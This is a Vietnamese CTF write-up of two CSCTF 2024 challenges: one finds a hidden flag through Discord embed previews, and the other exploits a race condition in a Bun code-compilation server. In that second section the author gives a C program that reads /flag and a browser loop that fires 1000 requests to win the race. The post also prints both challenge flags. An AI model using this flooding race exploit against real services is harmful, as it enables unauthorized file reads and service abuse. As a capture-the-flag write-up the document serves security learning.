---
layout: post
title:  "Writeup CSCTF 2024"
tags: [writeup, misc]
authors: [1]
image: /assets/vietthao/CSCTF-2024/thumbnail.png
---

## 1. Share The Flag

>You are an investigator hired by a cybersecurity company to investigate recent flag leaks. You managed to get a hold of incriminatory messages traded by one of the company employees and a possible flag re-seller. You proceeded to temporarily arrest that same employee but he is going to be released soon unless you can prove that what he shared was the real deal. If you want to prevent this, you need to find the flag as soon as possible.
>
><img src="https://i.imgur.com/sCKoY2o.png">
>
>Note: This is a Challenge from our sponsor, and all premium features are out-of-scope. Please do not try to use any kind of automated tools or spam requests to solve it!
>
>Hint: There are 2 important pieces of information that one can get from the discord screenshot. One is the fact that the mention of a VPN, hints to the IP History page.
>
>Hint 2: Think about how discord knows to display such a good looking embed and the technology used in the site.
>
>Author: Cybersharing

Từ bức ảnh trong đề bài, ta thấy có đường link dẫn đến [https://cybersharing.net/s/f5a56b9b91398211](https://cybersharing.net/s/f5a56b9b91398211)

<img src="https://img001.prntscr.com/file/img001/3rDr7c3xQtuTVK50ikXkYA.png">

Tải file video.mp4 này về mở lên thì y như rằng thấy mặt của người anh Rick thân quen :D

<img src="https://img001.prntscr.com/file/img001/ZK8qqyrgRPiJFb9VzfLclA.png">

Thử vào upload 1 file, thấy có option "Save to IP history" và "View IP history", có liên quan tới thông tin mà bức ảnh kia nhắc tới, về "home vpn" với "cybersharing vpn" gì đó.

<img src="https://img001.prntscr.com/file/img001/aT5MSoUATUObEbSzbRT5sQ.png">

Sau khi upload file, vào trang "View IP history", ta được thông tin như sau:

<img src="https://img001.prntscr.com/file/img001/LOPkf1jdTN20TQ995BlQTA.png">

Có vẻ mấy hint trong đoạn chat mà ban tổ chức đưa ra hơi lạc đề một xíu, nên trong suốt nửa đầu cuộc thi không có đội nào giải được bài này, tới khi BTC đưa ra hint thứ 2 về việc Discord nhúng thông tin trong chat thì mới có đội bắt đầu giải được.

Thì ra cái mà BTC muốn hướng đến trong bài này đó là khai thác cơ chế hiển thị thông tin nhúng (embed) trong tin nhắn. Điều đó thể hiện ở chỗ khi chúng ta gửi một đường link bất kì trong Discord thì nó sẽ đọc thông tin từ đường dẫn đó và hiển thị thông tin (title, ảnh, metadata,...) giống như trong bức ảnh ban đầu.

Sau khi biết được thông tin này thì mình đã đi tìm xem Discord hiển thị thông tin nhúng bằng cách nào, và mình tìm được trang [https://discord.com/developers/embeds](https://discord.com/developers/embeds) cho phép debug xem link của chúng ta khi gửi lên Discord thì trông sẽ ra sao.

Nhập thử cái link file anh Rick ban đầu vào bấm debug, ta được thông tin như sau:

<img src="https://img001.prntscr.com/file/img001/gFVxjwVuS4q19emtFAFMZg.png">

Tiếp sau nhập vào link [https://cybersharing.net/history](https://cybersharing.net/history) (link trang view history lúc nãy) thì nó hiển thị embeds trống không

<img src="https://img001.prntscr.com/file/img001/Nd1LhCf0QiK6isXQ3HnnGA.png">

Tuy nhiên khi ta bật F12 lên xem network requests thì thấy trong response có trả về phần html body gì đó

<img src="https://img001.prntscr.com/file/img001/8IVC2zqjSOyMIwUb3zxq4w.png">

Đem phần body này save thành file html rồi mở lên thì thấy có đường dẫn tới file flag.txt ở [s/13f17b167f2229809a95fb9d8c725449](https://cybersharing.net/s/13f17b167f2229809a95fb9d8c725449). Tải file này về mở lên ta được flag.

<img src="https://img001.prntscr.com/file/img001/IG41PgHrSYyADncOfB1vQg.png">

Flag: `CSCTF{dd4a22b47251fd92207cc057c37728a2}`

## 2. buncom

>Did Bun fix shell injection? Find out in hitcon eaas the sequel!
>
>Author: nullchilly

Đề bài cho file `handout_buncom.zip`, giải nén ra ta được cấu trúc thư mục như sau:
```bash
├── Dockerfile
├── flag
└── src
    ├── default.c
    ├── index.js
    └── submit.js
```

Build và chạy docker container bằng lệnh:
```bash
docker build -t buncom .
docker run -p 1337:1337 buncom
```

Ta được giao diện như sau:

<img src="https://img001.prntscr.com/file/img001/rjHe1gctQ1WKtwL62KogHA.png">

Dùng BurpSuite browser để truy cập web sau đó bấm submit, được 1 request như sau:

<img src="https://img001.prntscr.com/file/img001/De7-tlmsQ1ugg4SIWDTRUw.png">

Tham số querystring `code` ở bên trái, khi decode ra ta được chính đoạn code trong ô textbox như ở thanh bên phải.

Tiếp tục phân tích đoạn code server chính trong file `src/index.js`.

```javascript
import { $ } from "bun";

const src = "/tmp/custom.c", exe = "/tmp/a.out"

// Copy file default.c vào đường dẫn /tmp/custom.c
// Compile code bằng lệnh tcc /tmp/custom.c -o /tmp/a.out
// Tạo hash MD5 bằng lệnh md5sum /tmp/a.out
// Gán giá trị này vào biến hash
let hash = await $`
  cp default.c ${src};
  timeout 0.1 tcc ${src} -o ${exe};
  timeout 0.1 md5sum ${exe}`.text(), output = ""

// Mở server ở port 1337 bằng Bun
const server = Bun.serve({
  host: "0.0.0.0",
  port: 1337,
  async fetch(req) {
    const url = new URL(req.url);
    if (url.pathname === "/") {
      // Lấy phần code ở tham số code trong querystring
      const code = (new URLSearchParams(url.search)).get('code')
      if (code) {
        try {
          // Lưu file code vào đường dẫn /tmp/custom.c
          // Build file code vừa lưu bằng lệnh tcc /tmp/custom.c -o /tmp/a.out
          output = await $`echo ${code} > ${src}; timeout 0.1 tcc ${src} -o ${exe}`.text()
        } catch (err) {
          output = err.stderr.toString();
        }
      }
      // Kiểm tra xem MD5 hash của file vừa build ở trên có giống hash của file ban đầu hay không 
      if (await $`timeout 0.1 md5sum ${exe}`.text() !== hash) {
        // Nếu không giống thì build lại file ban đầu đè lên code của chúng ta gửi
        await $`timeout 0.1 tcc default.c -o ${exe}`.text();
        output = `md5sum ${exe} != ` + hash;
      }
      // Chạy file vừa build
      let html = await $`${exe}`.text()
      html = html.replace('__CODE__', Bun.escapeHTML(await Bun.file(src).text()))
      return new Response(output + html, {
        headers: {
          "Content-Type": "text/html; charset=utf-8",
          "Content-Security-Policy": "script-src 'self'; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script';"
        }
      });
    } else if (url.pathname === '/submit.js') {
      return new Response(await Bun.file('submit.js').text(), {
        headers: { 'Content-Type': 'application/javascript' },
      });
    }
  }
});

console.log(`listening on http://localhost:${server.port}`);
```

Sau khi đọc, ta lờ mờ đoán ý tưởng của bài muốn ta phải làm sao để cho MD5 hash của file gửi lên giống với file ban đầu thì file đó mới được thực thi. Có thể nghĩ tới MD5 hash collision generation, tuy nhiên việc padding thêm code vào để tạo ra collision mong muốn có vẻ không dễ.

Cơ mà trong khi đọc source code, mình phát hiện ra điều gì đó "sai sai". 

Cụ thể là ở dòng 27 và 39 trong đoạn code trên:

```javascript
...
line 27: output = await $`echo ${code} > ${src}; timeout 0.1 tcc ${src} -o ${exe}`.text()
...
line 39: let html = await $`${exe}`.text()
```

Trong khi dòng 27 có nhiệm vụ build source code mà chúng ta gửi lên, thì dòng 39 có nhiệm vụ thực thi đoạn code đã được build ra. Nếu như chạy code một cách tuyến tính thì đoạn code ở dòng 27 của ta sẽ không thể thực thi được do đoạn check và ghi đè trước đó ở dòng 33-37.

Tuy nhiên sẽ ra sao nếu như server phải xử lý 2 requests cùng lúc, một request đang xử lý tới dòng 27 trong khi request kia xử lý tới dòng 39?

Khi này, file code vừa được chúng ta build xong ở dòng 27 sẽ ngay lập tức được thực thi ở dòng 39, bỏ qua tất cả phần kiểm tra ở dòng 33-37 => `Race condition`.

Với ý tưởng này, ta chỉ cần spam lên server đoạn code để đọc file flag (thấy bảo dùng `system("cat /flag")` là được cơ mà lúc đấy mình không nghĩ ra =) ))
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    FILE *file;
    char filename[] = "/flag";
    char ch;
    file = fopen(filename, "r");
    if (file == NULL) {
        printf("Could not open file %s\n", filename);
        return 1;
    }
    while ((ch = fgetc(file)) != EOF) {
        putchar(ch);
    }
    fclose(file);
    return 0;
}
```

Mình spam luôn bằng hàm fetch trong browser console
```javascript
for (let i = 0; i < 1000; i++) fetch("https://<chall>/?code=%23include%20%3Cstdio.h%3E%0A%23include%20%3Cstdlib.h%3E%0A%0Aint%20main()%20%7B%0A%20%20%20%20FILE%20*file%3B%0A%20%20%20%20char%20filename%5B%5D%20%3D%20%22%2Fflag%22%3B%0A%20%20%20%20char%20ch%3B%0A%20%20%20%20file%20%3D%20fopen(filename%2C%20%22r%22)%3B%0A%20%20%20%20if%20(file%20%3D%3D%20NULL)%20%7B%0A%20%20%20%20%20%20%20%20printf(%22Could%20not%20open%20file%20%25s%5Cn%22%2C%20filename)%3B%0A%20%20%20%20%20%20%20%20return%201%3B%0A%20%20%20%20%7D%0A%20%20%20%20while%20((ch%20%3D%20fgetc(file))%20!%3D%20EOF)%20%7B%0A%20%20%20%20%20%20%20%20putchar(ch)%3B%0A%20%20%20%20%7D%0A%20%20%20%20fclose(file)%3B%0A%20%20%20%20return%200%3B%0A%7D%0A", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": null,
  "method": "GET",
  "mode": "cors",
  "credentials": "include"
}).then(res => res.text()).then(text => { if (text.includes('CSCTF')) console.log(text) });
```

Flag: `CSCTF{I_tried_so_hard:(_and_got_so_far._But_in_the_end,_/flag_doesn't_even_matter!4ZeR18AXbDlZvKor91No}`